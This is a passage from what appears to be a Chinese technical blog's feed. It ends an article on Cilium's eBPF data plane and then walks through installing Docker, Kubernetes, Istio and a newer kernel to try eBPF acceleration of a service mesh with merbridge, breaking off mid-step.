Buffer中，内核会通过NAPI轮训调取Ring Buffer数据</li><li>经过XDP，对数据进行PASS、DROP等操作，前提是网卡支持XDP</li><li>内核给数据分配skb，skb是网络在内核中的结构体</li><li>经过GRO，将数据包进行组合封包，提升网络吞吐</li><li>经过TC ingress，包括流量限速，流量整形，策略应用等操作</li><li>经过Netfilter</li><li>经过TC egress，出口流量的队列调度等操作</li><li>经过GSO，将大封包转为小封包</li><li>本地流量走第17步，远程流量走第18步</li></ul><h5 id="Cilium数据平面-eBPF"><a href="#Cilium数据平面-eBPF" class="headerlink" title="Cilium数据平面-eBPF"></a>Cilium数据平面-eBPF</h5><p><img src="/2022/03/18/略知一二之Cilium/11.png" alt="11"></p><h5 id="Cilium数据平面-service转发"><a href="#Cilium数据平面-service转发" class="headerlink" title="Cilium数据平面-service转发"></a>Cilium数据平面-service转发</h5><ul><li>南北向流量：XDP或TC</li><li>东西向流量：BPF socket</li></ul><h5 id="Cilium数据转发与tc-hook"><a href="#Cilium数据转发与tc-hook" class="headerlink" title="Cilium数据转发与tc hook"></a>Cilium数据转发与tc hook</h5><p><img src="/2022/03/18/略知一二之Cilium/12.png" alt="12"></p><p>Cilium 在主机网络空间上创建了三个虚拟接口：ciliumhost、ciliumnet和ciliumvxlan。Cilium Agent 在启动时创建一个名为“ciliumhost -&gt; ciliumnet”的 veth 对，并将 CIDR 的第一个IP地址设置为 ciliumhost，然后作为 CIDR 的网关。CNI 插件会生成 BPF 规则，编译后注入内核，以解决veth对之间的连通问题。</p><h5 id="Cilium组网模式-VxLan"><a href="#Cilium组网模式-VxLan" class="headerlink" title="Cilium组网模式-VxLan"></a>Cilium组网模式-VxLan</h5><p><img src="/2022/03/18/略知一二之Cilium/13.png" alt="13"></p><h5 id="Cilium组网模式-BGP-router"><a href="#Cilium组网模式-BGP-router" class="headerlink" title="Cilium组网模式-BGP router"></a>Cilium组网模式-BGP router</h5><p><img src="/2022/03/18/略知一二之Cilium/14.png" alt="14"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.cnxct.com/how-does-cilium-use-ebpf-with-go-and-c/" target="_blank" rel="noopener">https://www.cnxct.com/how-does-cilium-use-ebpf-with-go-and-c/</a></li><li><a href="https://rexrock.github.io/post/cilium2/" target="_blank" rel="noopener">https://rexrock.github.io/post/cilium2/</a></li><li><a href="https://arthurchiao.art/blog/understanding-ebpf-datapath-in-cilium-zh/" target="_blank" rel="noopener">https://arthurchiao.art/blog/understanding-ebpf-datapath-in-cilium-zh/</a></li><li><a href="https://www.bookstack.cn/read/cilium-1.10-en/0caa2e34522dac68.md" target="_blank" rel="noopener">https://www.bookstack.cn/read/cilium-1.10-en/0caa2e34522dac68.md</a></li><li><a href="https://docs.cilium.io/en/v0.12/intro/" target="_blank" rel="noopener">https://docs.cilium.io/en/v0.12/intro/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;What-is-Cilium？&quot;&gt;&lt;a href=&quot;#What-is-Cilium？&quot; class=&quot;headerlink&quot; title=&quot;What is Cilium？&quot;&gt;&lt;/a&gt;What is Cilium？&lt;/h4&gt;&lt;p&gt;Cilium is open sou
      
    
    </summary>
    
    
      <category term="Cloud Security" scheme="elssm.github.io/tags/Cloud-Security/"/>
    
  </entry>
  
  <entry>
    <title>从0到0.5:eBPF加速ServiceMesh实践</title>
    <link href="elssm.github.io/2022/02/28/%E4%BB%8E0%E5%88%B00-5-eBPF%E5%8A%A0%E9%80%9FServiceMesh%E5%AE%9E%E8%B7%B5/"/>
    <id>elssm.github.io/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/</id>
    <published>2022-02-28T05:06:42.000Z</published>
    <updated>2022-03-08T03:16:03.067Z</updated>
    
    <content type="html"><![CDATA[<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><h5 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h5><h6 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure><h6 id="导入存储库的GPG密钥"><a href="#导入存储库的GPG密钥" class="headerlink" title="导入存储库的GPG密钥"></a>导入存储库的GPG密钥</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h6 id="添加Docker-APT存储库到系统"><a href="#添加Docker-APT存储库到系统" class="headerlink" title="添加Docker APT存储库到系统"></a>添加Docker APT存储库到系统</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"</span><br></pre></td></tr></table></figure><h6 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>docker版本：20.10.12</p><p>查看docker服务启动状况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# systemctl status docker</span><br><span class="line">● docker.service - Docker Application Container Engine</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled</span><br><span class="line">   Active: active (running) since Thu 2022-02-10 07:23:33 UTC; 10min ago</span><br><span class="line">     Docs: https://docs.docker.com</span><br><span class="line"> Main PID: 2663 (dockerd)</span><br><span class="line">    Tasks: 9</span><br><span class="line">   CGroup: /system.slice/docker.service</span><br><span class="line">           └─2663 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.so</span><br><span class="line"></span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763625795Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763656800Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.763676563Z" level=warn</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.764235662Z" level=info</span><br><span class="line">Feb 10 07:23:32 ubuntu dockerd[2663]: time="2022-02-10T07:23:32.961536719Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.039790463Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.070305288Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu dockerd[2663]: time="2022-02-10T07:23:33.070463909Z" level=info</span><br><span class="line">Feb 10 07:23:33 ubuntu systemd[1]: Started Docker Application Container Engine.</span><br></pre></td></tr></table></figure><h5 id="Kubernetes安装"><a href="#Kubernetes安装" class="headerlink" title="Kubernetes安装"></a>Kubernetes安装</h5><h6 id="安装https工具使得apt支持ssl传输"><a href="#安装https工具使得apt支持ssl传输" class="headerlink" title="安装https工具使得apt支持ssl传输"></a>安装https工具使得apt支持ssl传输</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https</span><br></pre></td></tr></table></figure><h6 id="使用阿里云的源"><a href="#使用阿里云的源" class="headerlink" title="使用阿里云的源"></a>使用阿里云的源</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line">echo "deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main" &gt; /etc/apt/sources.list.d/kubernetes.list</span><br></pre></td></tr></table></figure><h6 id="或使用中科大的源"><a href="#或使用中科大的源" class="headerlink" title="或使用中科大的源"></a>或使用中科大的源</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial main</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>更新apt报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  The following signatures couldn't be verified because the public key is not available: NO_PUBKEY FEEA9169307EA071 NO_PUBKEY 8B57C5C2836F4BEB</span><br><span class="line">Reading package lists... Done</span><br><span class="line">W: GPG error: http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY FEEA9169307EA071 NO_PUBKEY 8B57C5C2836F4BEB</span><br><span class="line">E: The repository 'http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial InRelease' is not signed.</span><br><span class="line">N: Updating from such a repository can't be done securely, and is therefore disabled by default.</span><br><span class="line">N: See apt-secure(8) manpage for repository creation and user configuration details.</span><br></pre></td></tr></table></figure><p>报错提示我们需要制作一个key，其中<code>836F4BEB</code>是<code>NO_PUBKEY</code>的后八位</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --keyserver keyserver.ubuntu.com --recv-keys 836F4BEB</span><br><span class="line">gpg --export --armor  836F4BEB | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>之后重新<code>apt-get update</code>即可</p><h6 id="下载相关工具"><a href="#下载相关工具" class="headerlink" title="下载相关工具"></a>下载相关工具</h6><p>修改docker的<code>daemon.json</code>，将cgroup驱动和k8s设置为一致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu1:~# cat /etc/docker/daemon.json</span><br><span class="line">    &#123;</span><br><span class="line">        "exec-opts": ["native.cgroupdriver=systemd"],</span><br><span class="line">        "registry-mirrors": [</span><br><span class="line">        "https://docker.mirrors.ustc.edu.cn/",</span><br><span class="line">        "https://hub-mirror.c.163.com"],</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure><h6 id="查看k8s版本"><a href="#查看k8s版本" class="headerlink" title="查看k8s版本"></a>查看k8s版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl version</span><br><span class="line">Client Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:25:17Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br><span class="line">Server Version: version.Info&#123;Major:"1", Minor:"23", GitVersion:"v1.23.3", GitCommit:"816c97ab8cff8a1c72eccca1026f7820e93e0d25", GitTreeState:"clean", BuildDate:"2022-01-25T21:19:12Z", GoVersion:"go1.17.6", Compiler:"gc", Platform:"linux/amd64"&#125;</span><br></pre></td></tr></table></figure><h6 id="初始化master节点"><a href="#初始化master节点" class="headerlink" title="初始化master节点"></a>初始化master节点</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init \</span><br><span class="line">--apiserver-advertise-address=192.168.19.84 \</span><br><span class="line">--image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">--pod-network-cidr=10.244.0.0/16</span><br></pre></td></tr></table></figure><h6 id="配置kubectl工具"><a href="#配置kubectl工具" class="headerlink" title="配置kubectl工具"></a>配置kubectl工具</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br></pre></td></tr></table></figure><h6 id="查看节点状态"><a href="#查看节点状态" class="headerlink" title="查看节点状态"></a>查看节点状态</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get nodes</span><br><span class="line">NAME     STATUS     ROLES                  AGE   VERSION</span><br><span class="line">ubuntu   NotReady   control-plane,master   15m   v1.23.3</span><br></pre></td></tr></table></figure><p>状态显示为<code>NotReady</code>，查看日志，发现没有安装网络插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# journalctl -u kubelet -f</span><br><span class="line">-- Logs begin at Mon 2020-02-24 09:48:27 UTC. --</span><br><span class="line">Feb 10 08:08:58 ubuntu kubelet[11230]: I0210 08:08:58.892005   11230 cni.go:240] "Unable to update cni config" err="no networks found in /etc/cni/net.d"</span><br></pre></td></tr></table></figure><h6 id="安装pod插件flannel"><a href="#安装pod插件flannel" class="headerlink" title="安装pod插件flannel"></a>安装pod插件flannel</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line">Warning: policy/v1beta1 PodSecurityPolicy is deprecated in v1.21+, unavailable in v1.25+</span><br><span class="line">podsecuritypolicy.policy/psp.flannel.unprivileged created</span><br><span class="line">clusterrole.rbac.authorization.k8s.io/flannel created</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/flannel created</span><br><span class="line">serviceaccount/flannel created</span><br><span class="line">configmap/kube-flannel-cfg created</span><br><span class="line">daemonset.apps/kube-flannel-ds created</span><br></pre></td></tr></table></figure><h6 id="再次查看节点状态"><a href="#再次查看节点状态" class="headerlink" title="再次查看节点状态"></a>再次查看节点状态</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get nodes</span><br><span class="line">NAME     STATUS   ROLES                  AGE   VERSION</span><br><span class="line">ubuntu   Ready    control-plane,master   18m   v1.23.3</span><br></pre></td></tr></table></figure><h6 id="允许master部署pod"><a href="#允许master部署pod" class="headerlink" title="允许master部署pod"></a>允许master部署pod</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl taint nodes --all node-role.kubernetes.io/master-</span><br></pre></td></tr></table></figure><h4 id="服务网格"><a href="#服务网格" class="headerlink" title="服务网格"></a>服务网格</h4><p>服务网格是一个专注于处理服务间通信的基础设施层，它负责在现代云原生应用组成的复杂网络拓扑中可靠的传递请求</p><p>服务网格特点</p><ul><li>轻量级的网络代理</li><li>应用无感知</li><li>应用之间的流量由服务网格接管</li><li>服务间的调用可能出现的超时、重试、监控、追踪等工作下沉到服务网格层处理</li></ul><p>网格一般由数据平面和控制平面组成，数据平面负责在服务中部署一个sidecar的请求代理，控制平面负责请求代理之间的交互，以及用户与请求代理的交互。</p><h5 id="Istio"><a href="#Istio" class="headerlink" title="Istio"></a>Istio</h5><p>通过负载均衡、service-to-service身份验证、监视等方法，Istio可以轻松地创建部署服务网格，而服务代码更改很少或没有更改，我们可以在整个环境中部署一个特殊的sidecar代理来为服务添加Istio支持，该代理可以拦截微服务之间的所有网络通信，然后使用其控制平面功能来配置和管理Istio，其中包括：</p><ul><li>HTTP、gRPC、WebSocket和TCP流量的自动负载平衡</li><li>使用丰富的路由规则、重试、故障转移和故障注入对流量欣慰进行细粒度控制</li><li>支持访问控制、速率限制和配额的可插拔策略层和配置API</li><li>集群内所有流量的自动度量、日志和跟踪，包括集群入口和出口</li><li>在具有强大的基于身份的身份验证和授权的集群中实现安全的服务到服务通信</li></ul><p>Istio的核心功能</p><h6 id="流量管理"><a href="#流量管理" class="headerlink" title="流量管理"></a>流量管理</h6><p>Istio的简单规则配置和流量路由允许控制服务之间的流量和API调用流，Istio简化了服务级属性(如断路器，超时和重试)的配置，并且简化了设置重要任务(如A/B测试，金丝雀测试和按百分比划分的分阶段测试)的工作。有了过呢好的流量可视性和开箱即用故障恢复功能，可以在问题产生之前捕获问题，使调用更可靠，网络更健壮。</p><h6 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h6><p>Istio的安全功能使开发人员可以专注于应用程序级别的安全。Istio提供了底层的安全通信通道，并按比例管理服务通信的身份验证、授权和加密。通过Istio，服务通信在缺省情况下是安全的。允许在不同的协议和运行时之间一致地实施策略。</p><h6 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h6><p>Isio的见状跟踪、监视和日志功能使得我们可以更加深入了解服务网格部署。通过Istio的监视功能，可以真正理解服务性能如何影响上游和下游的事情。而它的自定义仪表板提供了对所有服务的性能的可见性。</p><h5 id="安装Istio"><a href="#安装Istio" class="headerlink" title="安装Istio"></a>安装Istio</h5><p>安装文档地址：<a href="https://istio.io/latest/docs/setup/getting-started/" target="_blank" rel="noopener">https://istio.io/latest/docs/setup/getting-started/</a></p><h6 id="下载1-11-6版本"><a href="#下载1-11-6版本" class="headerlink" title="下载1.11.6版本"></a>下载1.11.6版本</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.11.6 sh -</span><br></pre></td></tr></table></figure><h6 id="进入到下载目录"><a href="#进入到下载目录" class="headerlink" title="进入到下载目录"></a>进入到下载目录</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd istio-1.11.6/</span><br></pre></td></tr></table></figure><h6 id="添加istioctl客户端到路径"><a href="#添加istioctl客户端到路径" class="headerlink" title="添加istioctl客户端到路径"></a>添加istioctl客户端到路径</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PWD/bin:$PATH</span><br></pre></td></tr></table></figure><h6 id="查看Istio部署模式"><a href="#查看Istio部署模式" class="headerlink" title="查看Istio部署模式"></a>查看Istio部署模式</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# istioctl profile list</span><br><span class="line">Istio configuration profiles:</span><br><span class="line">    default</span><br><span class="line">    demo</span><br><span class="line">    empty</span><br><span class="line">    external</span><br><span class="line">    minimal</span><br><span class="line">    openshift</span><br><span class="line">    preview</span><br><span class="line">    remote</span><br></pre></td></tr></table></figure><h6 id="设置部署模式为demo"><a href="#设置部署模式为demo" class="headerlink" title="设置部署模式为demo"></a>设置部署模式为demo</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istioctl manifest apply --set profile=demo</span><br></pre></td></tr></table></figure><h6 id="添加命名空间的标签"><a href="#添加命名空间的标签" class="headerlink" title="添加命名空间的标签"></a>添加命名空间的标签</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl label namespace default istio-injection=enabled</span><br><span class="line">namespace/default labeled</span><br></pre></td></tr></table></figure><h5 id="部署案例应用"><a href="#部署案例应用" class="headerlink" title="部署案例应用"></a>部署案例应用</h5><h6 id="部署bookinfo案例"><a href="#部署bookinfo案例" class="headerlink" title="部署bookinfo案例"></a>部署bookinfo案例</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl apply -f samples/bookinfo/platform/kube/bookinfo.yaml</span><br><span class="line">service/details created</span><br><span class="line">serviceaccount/bookinfo-details created</span><br><span class="line">deployment.apps/details-v1 created</span><br><span class="line">service/ratings created</span><br><span class="line">serviceaccount/bookinfo-ratings created</span><br><span class="line">deployment.apps/ratings-v1 created</span><br><span class="line">service/reviews created</span><br><span class="line">serviceaccount/bookinfo-reviews created</span><br><span class="line">deployment.apps/reviews-v1 created</span><br><span class="line">deployment.apps/reviews-v2 created</span><br><span class="line">deployment.apps/reviews-v3 created</span><br><span class="line">service/productpage created</span><br><span class="line">serviceaccount/bookinfo-productpage created</span><br><span class="line">deployment.apps/productpage-v1 created</span><br></pre></td></tr></table></figure><h6 id="查看pod情况"><a href="#查看pod情况" class="headerlink" title="查看pod情况"></a>查看pod情况</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl get pods</span><br><span class="line">NAME                              READY   STATUS    RESTARTS   AGE</span><br><span class="line">details-v1-5498c86cf5-bhv2h       2/2     Running   0          13m</span><br><span class="line">productpage-v1-65b75f6885-p6k2w   2/2     Running   0          13m</span><br><span class="line">ratings-v1-b477cf6cf-k84kr        2/2     Running   0          13m</span><br><span class="line">reviews-v1-79d546878f-q6f62       2/2     Running   0          13m</span><br><span class="line">reviews-v2-548c57f459-cqq2r       2/2     Running   0          13m</span><br><span class="line">reviews-v3-6dd79655b9-gr42h       2/2     Running   0          13m</span><br></pre></td></tr></table></figure><h6 id="检查运行是否正常"><a href="#检查运行是否正常" class="headerlink" title="检查运行是否正常"></a>检查运行是否正常</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl exec "$(kubectl get pod -l app=ratings -o jsonpath='&#123;.items[0].metadata.name&#125;')" -c ratings -- curl -sS productpage:9080/productpage | grep -o "&lt;title&gt;.*&lt;/title&gt;"</span><br><span class="line">&lt;title&gt;Simple Bookstore App&lt;/title&gt;</span><br></pre></td></tr></table></figure><h5 id="开启外部访问"><a href="#开启外部访问" class="headerlink" title="开启外部访问"></a>开启外部访问</h5><h6 id="关联Istio网关"><a href="#关联Istio网关" class="headerlink" title="关联Istio网关"></a>关联Istio网关</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f samples/bookinfo/networking/bookinfo-gateway.yaml</span><br></pre></td></tr></table></figure><h6 id="查看服务外部访问方式"><a href="#查看服务外部访问方式" class="headerlink" title="查看服务外部访问方式"></a>查看服务外部访问方式</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# kubectl get svc istio-ingressgateway -n istio-system</span><br><span class="line">NAME                   TYPE       CLUSTER-IP     EXTERNAL-IP   PORT(S)                                                                      AGE</span><br><span class="line">istio-ingressgateway   LoadBalancer   10.96.244.67   &lt;none&gt;        15021:32085/TCP,80:31356/TCP,443:31869/TCP,31400:31862/TCP,15443:31190/TCP</span><br></pre></td></tr></table></figure><h6 id="修改访问方式为NodePort"><a href="#修改访问方式为NodePort" class="headerlink" title="修改访问方式为NodePort"></a>修改访问方式为NodePort</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit svc istio-ingressgateway -n istio-system</span><br></pre></td></tr></table></figure><h6 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/istio-1.11.6# curl 192.168.19.85:31356/productpage</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Simple Bookstore App&lt;/title&gt;</span><br><span class="line">&lt;meta charset="utf-8"&gt;</span><br><span class="line">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;</span><br><span class="line">&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Latest compiled and minified CSS --&gt;</span><br><span class="line">&lt;link rel="stylesheet" href="static/bootstrap/css/bootstrap.min.css"&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Optional theme --&gt;</span><br><span class="line">&lt;link rel="stylesheet" href="static/bootstrap/css/bootstrap-theme.min.css"&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br></pre></td></tr></table></figure><h4 id="ebpf加速ServiceMesh实验"><a href="#ebpf加速ServiceMesh实验" class="headerlink" title="ebpf加速ServiceMesh实验"></a>ebpf加速ServiceMesh实验</h4><p>代码地址：<a href="https://github.com/merbridge/merbridge" target="_blank" rel="noopener">https://github.com/merbridge/merbridge</a></p><h5 id="升级内核"><a href="#升级内核" class="headerlink" title="升级内核"></a>升级内核</h5><p>实验要求内核版本&gt;=5.7，首先我们还是通过命令查询指定版本的Linux镜像包，发现没有找到可用的版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# apt-cache search linux| grep 5.8</span><br></pre></td></tr></table></figure><p>因此我们直接去官方下载</p><p>地址：<a href="https://kernel.ubuntu.com/~kernel-ppa/mainline/" target="_blank" rel="noopener">https://kernel.ubuntu.com/~kernel-ppa/mainline/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-headers-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-headers-5.8.0-050800_5.8.0-050800.202008022230_all.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-image-unsigned-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br><span class="line">wget -c https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.8/amd64/linux-modules-5.8.0-050800-generic_5.8.0-050800.202008022230_amd64.deb</span><br></pre></td></tr></table></figure><p>安装内核Deb软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# sudo dpkg -i *.deb</span><br></pre></td></tr></table></figure><p>安装结束后，重新启动系统后查看内核版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# uname -r</span><br><span 